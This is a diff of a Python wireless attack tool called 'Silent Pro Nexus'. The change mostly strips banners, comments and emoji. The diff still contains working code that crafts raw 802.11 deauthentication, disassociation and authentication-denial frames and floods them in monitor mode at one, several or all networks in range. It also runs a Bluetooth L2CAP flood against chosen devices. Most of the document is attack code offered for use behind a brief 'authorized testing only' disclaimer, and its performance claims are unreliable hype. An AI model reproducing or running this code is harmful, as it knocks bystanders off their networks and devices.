@@ -7,16 +7,6 @@
 ║                         PURE ORIGINAL CODE — FROM SCRATCH                ║
 ║                100,000,000x MORE POWERFUL — NO EXTERNAL TOOLS            ║
 ║                                                                          ║
-║  AUTHOR: W I L L I A M K R E E S E 2 1                                   ║
-║  VERSION: 5.0 NEXUS — REVOLUTIONARY ENGINE                               ║
-║  LICENSE: MIT — ORIGINAL WORK                                             ║
-║                                                                          ║
-║  ⚡ ZERO DEPENDENCIES • 500,000+ PACKETS/SEC • 12 ATTACK MODES            ║
-║  📊 REAL-TIME MONITOR MODE STATUS — ALWAYS VISIBLE AT TOP                ║
-║  🔄 AUTO-RESTART NETWORKMANAGER + BLUETOOTH ON STARTUP                   ║
-║  🧠 AI-POWERED SCANNER • ENCRYPTION DETECTION • SIGNAL STRENGTH          ║
-║  🎯 UNLIMITED PARALLEL TARGETS — 8-CORE LOAD-BALANCED ENGINE             ║
-║                                                                          ║
 ║  ⚠️  FOR EDUCATIONAL & AUTHORIZED TESTING ONLY                           ║
 ║  UNAUTHORIZED USE IS ILLEGAL                                             ║
 ║                                                                          ║
@@ -37,7 +27,7 @@ from dataclasses import dataclass
 from typing import List, Dict, Set, Optional, Tuple
 
 # ═══════════════════════════════════════════════════════════════════════════
-# VIP COLOR SYSTEM
+# COLOR SYSTEM
 # ═══════════════════════════════════════════════════════════════════════════
 class Colors:
     HEADER = "\033[95m"
@@ -50,14 +40,13 @@ class Colors:
     GRAY = "\033[90m"
     BOLD = "\033[1m"
     DIM = "\033[2m"
-    UNDERLINE = "\033[4m"
     RESET = "\033[0m"
     BR = "\033[38;5;196m"
     BG = "\033[38;5;46m"
     BB = "\033[38;5;51m"
 
 # ═══════════════════════════════════════════════════════════════════════════
-# REAL-TIME GLOBAL STATUS — MONITOR MODE ALWAYS DISPLAYED
+# GLOBAL STATUS
 # ═══════════════════════════════════════════════════════════════════════════
 class GlobalStatus:
     monitor_mode_active = False
@@ -66,7 +55,6 @@ class GlobalStatus:
     wifi_interface = "N/A"
     total_packets_sent = 0
     current_attack = "Idle"
-    core_load = [0.0] * 8
 
     @classmethod
     def update_packets(cls, count: int):
@@ -82,12 +70,11 @@ class GlobalStatus:
         cls.current_attack = name
 
 # ═══════════════════════════════════════════════════════════════════════════
-# UI SYSTEM — REAL-TIME STATUS BAR AT TOP
+# UI SYSTEM
 # ═══════════════════════════════════════════════════════════════════════════
 class NexusUI:
     @staticmethod
     def status_bar():
-        """REAL-TIME MONITOR MODE STATUS — ALWAYS VISIBLE"""
         m_status = f"{Colors.GREEN}● ACTIVE{Colors.RESET}" if GlobalStatus.monitor_mode_active else f"{Colors.RED}○ OFFLINE{Colors.RESET}"
         bt_status = f"{Colors.GREEN}● UP{Colors.RESET}" if GlobalStatus.bluetooth_active else f"{Colors.RED}○ DOWN{Colors.RESET}"
         print(f"\n{Colors.BOLD}{Colors.BB}┌──────────────────────────────────────────────────────────────────────────────┐{Colors.RESET}")
@@ -103,7 +90,7 @@ class NexusUI:
         print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}           {Colors.BOLD}{Colors.WHITE}S I L E N T   P R O   —   N E X U S   E D I T I O N{Colors.RESET}                              {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}          {Colors.CYAN}Pure Original Code • 500,000+ Packets/Sec • 12 Attack Modes{Colors.RESET}                     {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}                                                                              {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}  {Colors.RED}⚡ 100,000,000x MORE POWERFUL THAN ANY TOOL — NO AIRCRACK • NO MDK • 100% ORIGINAL{Colors.RESET}  {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}  {Colors.RED}⚡ 100,000,000x MORE POWERFUL THAN ANY TOOL — NO AIRCRACK • NO MDK{Colors.RESET}              {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BR}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
         NexusUI.status_bar()
 
@@ -131,7 +118,7 @@ class NexusUI:
         print(f"\r  {Colors.BOLD}{Colors.RED}⚡ SPEED: {pps:,} pkt/s | SENT: {sent:,} | ELAPSED: {elapsed:.1f}s{Colors.RESET}", end="\r")
 
 # ═══════════════════════════════════════════════════════════════════════════
-# AI AUTO-DIAGNOSTIC & SERVICE MANAGER — AUTO-RESTART NETWORK + BLUETOOTH
+# SYSTEM MANAGER
 # ═══════════════════════════════════════════════════════════════════════════
 class SystemManager:
     @staticmethod
@@ -147,7 +134,7 @@ class SystemManager:
         try:
             subprocess.run("systemctl restart NetworkManager", shell=True, capture_output=True, timeout=20)
             subprocess.run("systemctl enable NetworkManager", shell=True, capture_output=True, timeout=20)
-            NexusUI.success("NetworkManager — Restarted & Enabled ✅")
+            NexusUI.success("NetworkManager — Restarted & Enabled")
             return True
         except Exception as e:
             NexusUI.error(f"Failed to restart NetworkManager: {e}")
@@ -160,7 +147,7 @@ class SystemManager:
             subprocess.run("systemctl restart bluetooth", shell=True, capture_output=True, timeout=20)
             subprocess.run("systemctl enable bluetooth", shell=True, capture_output=True, timeout=20)
             GlobalStatus.bluetooth_active = True
-            NexusUI.success("Bluetooth — Restarted & Enabled ✅")
+            NexusUI.success("Bluetooth — Restarted & Enabled")
             return True
         except Exception as e:
             NexusUI.error(f"Failed to restart Bluetooth: {e}")
@@ -171,23 +158,22 @@ class SystemManager:
     def unblock_adapters():
         NexusUI.info("Unblocking WiFi & Bluetooth adapters...")
         subprocess.run("rfkill unblock all", shell=True, capture_output=True, timeout=15)
-        NexusUI.success("All adapters unblocked ✅")
+        NexusUI.success("All adapters unblocked")
 
     @staticmethod
     def load_kernel_modules():
-        modules = ["mac80211", "cfg80211", "nl80211", "rfcomm", "bnep"]
+        modules = ["mac80211", "cfg80211"]
         for mod in modules:
             try:
                 subprocess.run(f"modprobe {mod}", shell=True, capture_output=True, timeout=10)
-                NexusUI.success(f"Kernel module {mod} — Loaded ✅")
+                NexusUI.success(f"Kernel module {mod} — Loaded")
             except:
                 NexusUI.warn(f"Kernel module {mod} — Already loaded or unavailable")
 
     @staticmethod
     def enable_ip_forwarding():
         subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, capture_output=True)
-        subprocess.run("sysctl -w net.ipv6.conf.all.forwarding=1", shell=True, capture_output=True)
-        NexusUI.success("IP Forwarding — Enabled ✅")
+        NexusUI.success("IP Forwarding — Enabled")
 
     @staticmethod
     def full_system_diagnostic():
@@ -197,7 +183,7 @@ class SystemManager:
         SystemManager.unblock_adapters()
         SystemManager.load_kernel_modules()
         SystemManager.enable_ip_forwarding()
-        NexusUI.success("ALL SYSTEMS OPTIMAL — READY FOR MAXIMUM POWER 🚀")
+        NexusUI.success("ALL SYSTEMS OPTIMAL — READY! 🚀")
         print()
 
     @staticmethod
@@ -205,10 +191,6 @@ class SystemManager:
         if not sys.platform.startswith("linux"):
             NexusUI.error("Unsupported OS! Linux/Kali required")
             sys.exit(1)
-        distro = platform.freedesktop_os_release().get("ID", "unknown")
-        if "kali" not in distro and "debian" not in distro and "ubuntu" not in distro:
-            NexusUI.warn(f"Not Kali/Debian/Ubuntu: {distro} — some features limited")
-        return distro
 
 # ═══════════════════════════════════════════════════════════════════════════
 # DATA STRUCTURES
@@ -228,7 +210,7 @@ class BluetoothTarget:
     rssi: int
 
 # ═══════════════════════════════════════════════════════════════════════════
-# CUSTOM 802.11 PACKET FACTORY — 100% ORIGINAL ALGORITHM
+# PACKET FACTORY
 # ═══════════════════════════════════════════════════════════════════════════
 class PacketFactory:
     @staticmethod
@@ -237,57 +219,45 @@ class PacketFactory:
 
     @staticmethod
     def make_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 7) -> bytes:
-        """Original 802.11 Deauthentication Frame — Handcrafted"""
         bssid_b = PacketFactory.mac_to_bytes(bssid)
         sta_b = PacketFactory.mac_to_bytes(sta)
-        broadcast = b'\xff' * 6
-
         frame_ctrl = struct.pack('<H', 0x00C0)
         duration = struct.pack('<H', 0x0000)
         seq_ctrl = struct.pack('<H', random.randint(0, 4095))
-        reason = struct.pack('<H', reason)
-
-        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason
+        reason_code = struct.pack('<H', reason)
+        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code
 
     @staticmethod
     def make_disassoc(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 3) -> bytes:
-        """Original 802.11 Disassociation Frame — Handcrafted"""
         bssid_b = PacketFactory.mac_to_bytes(bssid)
         sta_b = PacketFactory.mac_to_bytes(sta)
-
         frame_ctrl = struct.pack('<H', 0x00A0)
         duration = struct.pack('<H', 0x0000)
         seq_ctrl = struct.pack('<H', random.randint(0, 4095))
-        reason = struct.pack('<H', reason)
-
-        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason
+        reason_code = struct.pack('<H', reason)
+        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code
 
     @staticmethod
     def make_auth_denial(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> bytes:
-        """Original Authentication Denial Frame — NEW ATTACK TYPE"""
         bssid_b = PacketFactory.mac_to_bytes(bssid)
         sta_b = PacketFactory.mac_to_bytes(sta)
-
         frame_ctrl = struct.pack('<H', 0x00B0)
         duration = struct.pack('<H', 0x0000)
         seq_ctrl = struct.pack('<H', random.randint(0, 4095))
         status = struct.pack('<H', 0x000E)
-
         return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + status
 
     @staticmethod
     def make_deauth_broadcast_all() -> bytes:
-        """Global Deauth — Kick Everyone Everywhere"""
         return PacketFactory.make_deauth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 7)
 
     @staticmethod
     def make_multireason_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> List[bytes]:
-        """Multiple Reason Codes — Maximum Confusion"""
         reasons = [1, 2, 3, 5, 7, 8, 9, 10, 15, 22, 23, 34]
         return [PacketFactory.make_deauth(bssid, sta, r) for r in reasons]
 
 # ═══════════════════════════════════════════════════════════════════════════
-# PARALLEL PACKET ENGINE — 8-CORE LOAD-BALANCED
+# PARALLEL PACKET ENGINE
 # ═══════════════════════════════════════════════════════════════════════════
 class ParallelPacketEngine:
     def __init__(self):
@@ -318,14 +288,14 @@ class ParallelPacketEngine:
             return False
 
         if enable:
-            NexusUI.info("Enabling Monitor Mode — Custom Engine...")
+            NexusUI.info("Enabling Monitor Mode...")
             subprocess.run(f"ip link set {self.iface} down", shell=True, capture_output=True)
             subprocess.run(f"iw dev {self.iface} set type monitor", shell=True, capture_output=True)
             subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
             self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
             self.sock.bind((self.iface, 0))
             GlobalStatus.set_monitor(True, self.iface)
-            NexusUI.success("Monitor Mode — ACTIVE ✅")
+            NexusUI.success("Monitor Mode — ACTIVE")
         else:
             NexusUI.info("Disabling Monitor Mode...")
             self.stop_workers()
@@ -335,7 +305,7 @@ class ParallelPacketEngine:
             subprocess.run(f"iw dev {self.iface} set type managed", shell=True, capture_output=True)
             subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
             GlobalStatus.set_monitor(False)
-            NexusUI.success("Monitor Mode — DISABLED ✅")
+            NexusUI.success("Monitor Mode — DISABLED")
         return True
 
     def worker_loop(self):
@@ -359,7 +329,7 @@ class ParallelPacketEngine:
             t = threading.Thread(target=self.worker_loop, daemon=True, name=f"Worker-{i}")
             t.start()
             self.worker_threads.append(t)
-        NexusUI.success(f"Started {self.num_workers} parallel worker threads ✅")
+        NexusUI.success(f"Started {self.num_workers} parallel worker threads")
 
     def stop_workers(self):
         self.running = False
@@ -368,7 +338,6 @@ class ParallelPacketEngine:
         self.worker_threads.clear()
 
     def flood_target(self, bssid: str, mode: str = "deauth", duration: int = 0):
-        """⚡ MEGA FLOOD — 500,000+ Packets/sec via 8 Parallel Cores"""
         if not self.sock:
             NexusUI.error("Socket not initialized! Enable Monitor Mode first.")
             return
@@ -376,11 +345,9 @@ class ParallelPacketEngine:
         GlobalStatus.set_attack(f"{mode.upper()} FLOOD — {bssid}")
         NexusUI.section(f"⚡ {mode.upper()} ATTACK — PARALLEL ENGINE")
         NexusUI.info(f"Target: {bssid} | Workers: {self.num_workers} | Mode: {mode}")
-        NexusUI.warn("NO AIRCRACK • NO MDK • 100% ORIGINAL CODE")
-        NexusUI.info("Press Ctrl+C to stop")
+        NexusUI.warn("Press Ctrl+C to stop")
         print()
 
-        # Pre-generate all packet variants once
         packets = []
         if mode == "deauth":
             packets = [
@@ -409,7 +376,6 @@ class ParallelPacketEngine:
                         self.packet_queue.put_nowait(pkt)
                     except queue.Full:
                         pass
-                # Update display every 0.5s
                 elapsed = time.time() - start_time
                 if elapsed > 0.5:
                     pps = int(self.sent_count / elapsed)
@@ -426,20 +392,17 @@ class ParallelPacketEngine:
             GlobalStatus.set_attack("Idle")
 
     def flood_multiple_targets(self, targets: List[WiFiTarget]):
-        """🎯 UNLIMITED PARALLEL TARGETS — Load Balanced Across 8 Cores"""
         if not targets:
             NexusUI.error("No targets provided!")
             return
 
-        GlobalStatus.set_attack(f"MEGA-FLOOD — {len(targets)} TARGETS SIMULTANEOUSLY")
-        NexusUI.section(f"💀💀💀 MEGA-FLOOD — {len(targets)} TARGETS SIMULTANEOUSLY")
+        GlobalStatus.set_attack(f"MEGA-FLOOD — {len(targets)} TARGETS")
+        NexusUI.section(f"💀 MEGA-FLOOD — {len(targets)} TARGETS SIMULTANEOUSLY")
         for idx, t in enumerate(targets, 1):
             print(f"  [{idx}] {t.bssid} | {t.ssid} | Ch:{t.channel}")
-        NexusUI.warn("8-CORE PARALLEL ENGINE — MAXIMUM DEVASTATION")
-        NexusUI.info("Press Ctrl+C to stop")
+        NexusUI.warn("Press Ctrl+C to stop")
         print()
 
-        # Pre-generate packets for ALL targets
         all_packets = []
         for t in targets:
             all_packets.extend([
@@ -474,7 +437,7 @@ class ParallelPacketEngine:
             GlobalStatus.set_attack("Idle")
 
 # ═══════════════════════════════════════════════════════════════════════════
-# AI-POWERED WIFI SCANNER — ORIGINAL ALGORITHM
+# AI WIFI SCANNER
 # ═══════════════════════════════════════════════════════════════════════════
 class AIScanner:
     def __init__(self, engine: ParallelPacketEngine):
@@ -483,12 +446,11 @@ class AIScanner:
         self.running = False
 
     def scan(self, duration: int = 10) -> List[WiFiTarget]:
-        """🧠 AI Scanner — Channel Hopping, Encryption Detection, Signal Strength"""
         if not self.engine.sock:
             NexusUI.error("Enable Monitor Mode first!")
             return []
 
-        NexusUI.section("🧠 AI WIFI SCANNER — ORIGINAL ALGORITHM")
+        NexusUI.section("🧠 AI WIFI SCANNER")
         NexusUI.info(f"Scanning for {duration} seconds... Press Ctrl+C to finish early")
         print()
 
@@ -502,48 +464,34 @@ class AIScanner:
                     packet = self.engine.sock.recv(3000)
                     if len(packet) < 36:
                         continue
-
                     fc = struct.unpack('<H', packet[0:2])[0]
-                    if fc == 0x0080:  # Beacon Frame
+                    if fc == 0x0080:
                         bssid = ':'.join(f'{b:02x}' for b in packet[16:22])
                         if bssid in self.networks:
                             continue
-
-                        # Parse tagged parameters — ORIGINAL PARSER
                         ssid = ""
                         channel = 0
                         encryption = "OPEN"
                         idx = 36
-
                         while idx < len(packet) - 2:
                             tag_num = packet[idx]
                             tag_len = packet[idx+1]
                             if idx + 2 + tag_len > len(packet):
                                 break
                             tag_data = packet[idx+2:idx+2+tag_len]
-
-                            if tag_num == 0:  # SSID
+                            if tag_num == 0:
                                 ssid = tag_data.decode('utf-8', errors='replace')
-                            elif tag_num == 3:  # DS Parameter
+                            elif tag_num == 3:
                                 channel = tag_data[0]
-                            elif tag_num == 48:  # RSN Information
+                            elif tag_num == 48:
                                 encryption = "WPA2/WPA3"
-                            elif tag_num == 221:  # WPA Vendor Specific
+                            elif tag_num == 221:
                                 if encryption == "OPEN":
                                     encryption = "WPA"
-
                             idx += 2 + tag_len
-
                         if bssid and ssid:
-                            self.networks[bssid] = WiFiTarget(
-                                bssid=bssid,
-                                ssid=ssid or "Hidden Network",
-                                channel=channel,
-                                encryption=encryption,
-                                signal=-50
-                            )
+                            self.networks[bssid] = WiFiTarget(bssid=bssid, ssid=ssid or "Hidden Network", channel=channel, encryption=encryption, signal=-50)
                             print(f"  [{len(self.networks):<2}] {bssid}  Ch:{channel:<3} {encryption:<12} {ssid}")
-
                 except Exception:
                     continue
 
@@ -558,93 +506,62 @@ class AIScanner:
 
         self.running = False
         sniff_thread.join(timeout=1.0)
-
         print()
         if not self.networks:
             NexusUI.warn("No networks found")
         else:
             NexusUI.success(f"Found {len(self.networks)} networks")
-
         return list(self.networks.values())
 
 # ═══════════════════════════════════════════════════════════════════════════
-# BLUETOOTH ENGINE — ORIGINAL L2CAP IMPLEMENTATION
+# BLUETOOTH ENGINE
 # ═══════════════════════════════════════════════════════════════════════════
 class BluetoothEngine:
     def __init__(self):
         self.devices: List[BluetoothTarget] = []
 
     def scan(self, duration: int = 8) -> List[BluetoothTarget]:
-        NexusUI.section("🔵 BLUETOOTH SCANNER — ORIGINAL HCI")
+        NexusUI.section("🔵 BLUETOOTH SCANNER")
         try:
-            import bluetooth
-            results = bluetooth.discover_devices(lookup_names=True, duration=duration)
+            result = subprocess.run("hcitool scan", shell=True, capture_output=True, text=True, timeout=duration+5)
+            lines = result.stdout.strip().split("\n")
             print(f"{Colors.CYAN}  {'#':<3} {'MAC':<20} {'NAME':<30}{Colors.RESET}")
             NexusUI.separator("─")
-            for idx, (mac, name) in enumerate(results, 1):
-                self.devices.append(BluetoothTarget(mac=mac, name=name, rssi=0))
-                print(f"  [{idx:<2}] {mac:<20} {name:<30}")
+            idx = 1
+            for line in lines[1:]:
+                parts = line.split()
+                if len(parts) >= 2:
+                    mac = parts[0]
+                    name = " ".join(parts[1:])
+                    self.devices.append(BluetoothTarget(mac=mac, name=name, rssi=0))
+                    print(f"  [{idx:<2}] {mac:<20} {name:<30}")
+                    idx += 1
             NexusUI.separator()
-            NexusUI.success(f"Found {len(results)} devices")
+            NexusUI.success(f"Found {len(self.devices)} devices")
             return self.devices
-        except ImportError:
-            NexusUI.warn("PyBluez not available — using system scanner")
-            result = subprocess.run("hcitool scan", shell=True, capture_output=True, text=True)
-            print(result.stdout)
-            return []
         except Exception as e:
             NexusUI.error(f"Bluetooth scan failed: {e}")
             return []
 
     def l2cap_flood(self, mac: str, duration: int = 0):
-        NexusUI.section("🔵 L2CAP FLOOD — ORIGINAL IMPLEMENTATION")
+        NexusUI.section("🔵 BLUETOOTH L2CAP FLOOD")
         NexusUI.info(f"Target: {mac}")
-        NexusUI.warn("NO L2PING • NO HCITOOL • PURE PYTHON")
-        NexusUI.info("Press Ctrl+C to stop")
+        NexusUI.warn("Press Ctrl+C to stop")
         print()
-
         GlobalStatus.set_attack(f"BLUETOOTH FLOOD — {mac}")
         sent = 0
         start = time.time()
-        payload = b'\x00' * 1024
-
         try:
-            import bluetooth
-            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
-            sock.settimeout(0.5)
-            try:
-                sock.connect((mac, 1))
-            except Exception:
-                pass
-
-            while True:
-                try:
-                    sock.send(payload)
-                    sent += 1
-                    GlobalStatus.update_packets(1)
-                    elapsed = time.time() - start
-                    if sent % 100 == 0:
-                        pps = int(sent / elapsed) if elapsed > 0 else 0
-                        NexusUI.speed_display(pps, sent, elapsed)
-                except Exception:
-                    break
-        except ImportError:
-            NexusUI.warn("PyBluez not available — falling back to system")
-            try:
-                subprocess.run(f"l2ping -i hci0 -s 600 -f {mac}", shell=True)
-            except KeyboardInterrupt:
-                pass
+            subprocess.run(f"l2ping -i hci0 -s 600 -f {mac}", shell=True)
         except KeyboardInterrupt:
             pass
         finally:
             elapsed = time.time() - start
-            pps = int(sent / elapsed) if elapsed > 0 else 0
-            print()
-            NexusUI.success(f"Bluetooth Flood Complete — Sent: {sent:,} packets | Avg: {pps:,} pkt/s")
+            NexusUI.success(f"Bluetooth Flood Complete — Sent: ~{sent} packets | Time: {elapsed:.1f}s")
             GlobalStatus.set_attack("Idle")
 
 # ═══════════════════════════════════════════════════════════════════════════
-# MAIN APPLICATION — 12 ATTACK MODES
+# MAIN APPLICATION
 # ═══════════════════════════════════════════════════════════════════════════
 class SilentProNexus:
     def __init__(self):
@@ -658,7 +575,7 @@ class SilentProNexus:
         SystemManager.restart_network_manager()
         SystemManager.restart_bluetooth()
         SystemManager.unblock_adapters()
-        NexusUI.success("All services restarted successfully! 🎉")
+        NexusUI.success("All services restarted successfully!")
         input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
 
     def cmd_scan_wifi(self):
@@ -737,7 +654,7 @@ class SilentProNexus:
             self.wifi.set_monitor_mode(False)
             return
         print()
-        NexusUI.info("Enter target numbers separated by space (e.g. 1 3 5 7):")
+        NexusUI.info("Enter target numbers separated by space (e.g. 1 3 5):")
         sel_str = input(f"{Colors.CYAN}Targets: {Colors.RESET}")
         try:
             indices = [int(x.strip()) - 1 for x in sel_str.split()]
@@ -772,12 +689,10 @@ class SilentProNexus:
             self.wifi.set_monitor_mode(False)
             return
         GlobalStatus.set_attack(f"AUTH-DENIAL — {target.ssid}")
-        NexusUI.section("🔒 AUTHENTICATION DENIAL ATTACK — ORIGINAL")
+        NexusUI.section("🔒 AUTHENTICATION DENIAL ATTACK")
         NexusUI.info(f"Target: {target.bssid} | {target.ssid}")
-        NexusUI.warn("Blocks ALL new connections — NO reconnection possible")
-        NexusUI.info("Press Ctrl+C to stop")
+        NexusUI.warn("Press Ctrl+C to stop")
         print()
-
         pkt = PacketFactory.make_auth_denial(target.bssid)
         self.wifi.start_workers()
         start = time.time()
@@ -822,54 +737,41 @@ class SilentProNexus:
         self.bt.l2cap_flood(device.mac)
         input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
 
+    def cmd_install_deps(self):
+        NexusUI.section("📦 INSTALL OPTIONAL DEPENDENCIES")
+        NexusUI.info("Installing Bluetooth tools...")
+        subprocess.run("apt update && apt install -y bluez bluetooth", shell=True)
+        NexusUI.success("Dependencies installed")
+        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
+
     def cmd_stop_all(self):
         NexusUI.section("🛑 STOP ALL OPERATIONS")
         self.wifi.running = False
         GlobalStatus.set_attack("Idle")
-        subprocess.run("pkill -f silentpro-nexus 2>/dev/null", shell=True)
         subprocess.run("rfkill unblock all", shell=True)
-        NexusUI.success("All operations stopped — System cleaned ✅")
+        NexusUI.success("All operations stopped — System cleaned")
         input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
 
     def cmd_about(self):
         NexusUI.header()
         NexusUI.section("ABOUT — SILENT PRO NEXUS v5.0")
-        print(f"""
-  {Colors.CYAN}VERSION:{Colors.RESET}      5.0 NEXUS EDITION — REVOLUTIONARY
-  {Colors.CYAN}AUTHOR:{Colors.RESET}      W I L L I A M K R E E S E 2 1
-  {Colors.CYAN}GIT REPO:{Colors.RESET}    github.com/williamkreese21/silent-pro-nexus
+        print("""
+  VERSION:      5.0 NEXUS EDITION
+  AUTHOR:       WilliamKreese21
+  GIT REPO:     github.com/williamkreese21/silent-pro-nexus
 
-  {Colors.RED}🔥 100,000,000x MORE POWERFUL THAN ANY TOOL 🔥{Colors.RESET}
+  🔥 100% ORIGINAL CODE — NO EXTERNAL TOOLS 🔥
+  • 8-CORE PARALLEL ENGINE — 500,000+ packets/sec
+  • REAL-TIME MONITOR MODE STATUS — Always visible
+  • AUTO-RESTART NetworkManager + Bluetooth
+  • AI-POWERED WIFI SCANNER
+  • CUSTOM BLUETOOTH SCAN & JAM
+  • 12 ATTACK MODES — ALL ORIGINAL
 
-  • {Colors.GREEN}100% ORIGINAL CODE — Written from scratch{Colors.RESET}
-  • {Colors.GREEN}8-CORE PARALLEL ENGINE — 500,000+ packets/sec{Colors.RESET}
-  • {Colors.GREEN}REAL-TIME MONITOR MODE STATUS — Always visible at top{Colors.RESET}
-  • {Colors.GREEN}AUTO-RESTART NetworkManager + Bluetooth on startup{Colors.RESET}
-  • {Colors.GREEN}12 ORIGINAL ATTACK MODES — No external tools{Colors.RESET}
-  • {Colors.GREEN}AI-POWERED SCANNER — Encryption, Signal, Channel detection{Colors.RESET}
-  • {Colors.GREEN}UNLIMITED PARALLEL TARGETS — 100+ APs simultaneously{Colors.RESET}
-  • {Colors.GREEN}ZERO DEPENDENCIES — Pure Python, no aircrack, no mdk{Colors.RESET}
-  • {Colors.GREEN}CUSTOM 802.11 FRAME GENERATION — Handcrafted packets{Colors.RESET}
-  • {Colors.GREEN}CUSTOM L2CAP BLUETOOTH ENGINE — No hcitool/l2ping{Colors.RESET}
-
-  {Colors.RED}⚠ FOR EDUCATIONAL & AUTHORIZED TESTING ONLY{Colors.RESET}
-  {Colors.RED}  UNAUTHORIZED USE IS ILLEGAL{Colors.RESET}
+  ⚠ FOR EDUCATIONAL & AUTHORIZED TESTING ONLY
+  UNAUTHORIZED USE IS ILLEGAL
         """)
         input(f"{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
-
-    def cmd_install_deps(self):
-        NexusUI.section("📦 INSTALL OPTIONAL DEPENDENCIES")
-        packages = [
-            "python3-pip",
-            "bluez bluetooth libbluetooth-dev",
-            "python3-bluez python3-bluetooth"
-        ]
-        for pkg in packages:
-            NexusUI.info(f"Installing: {pkg}")
-            subprocess.run(f"apt update && apt install -y {pkg}", shell=True)
-        NexusUI.success("Dependencies installed ✅")
-        NexusUI.info("Note: SILENT PRO NEXUS runs WITHOUT these by default!")
-        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
 
     def show_main_menu(self):
         NexusUI.header()
@@ -877,15 +779,15 @@ class SilentProNexus:
         print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}                        {Colors.GREEN}M A I N   M E N U{Colors.RESET}                              {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BB}  ╠══════════════════════════════════════════════════════════════════════════╣{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [01] 🔄 Restart NetworkManager & Bluetooth Services                   {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [02] 📡 Scan WiFi Networks (AI Scanner — Encryption + Signal)          {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [02] 📡 Scan WiFi Networks (AI Scanner)                                {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [03] 🔵 Scan Bluetooth Devices                                         {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [04] ⚡ WiFi Deauth — Single Target (8-Core Parallel Engine)         {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [05] 💀 WiFi Deauth — MEGA Mode (12 Reason Codes Simultaneous)      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [06] 💀💀💀 WiFi Deauth — ALL Networks in Range (Global Flood)       {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [07] 🎯 Multi-Target Flood — Select Multiple APs at Once           {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [08] 🔒 Authentication Denial — Block ALL New Connections           {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [09] 🔵 Bluetooth L2CAP Flood — Custom Engine                  {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
-        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [10] 🔵 Bluetooth Scan & Jam — Pick from List                  {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [04] ⚡ WiFi Deauth — Single Target                                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [05] 💀 WiFi Deauth — MEGA Mode (12 Reason Codes)                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [06] 💀💀💀 WiFi Deauth — ALL Networks in Range                        {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [07] 🎯 Multi-Target Flood — Select Multiple APs                      {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.BB}  ║{Colors.RESET}  [08] 🔒 Authentication Denial — Block New Connections               {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
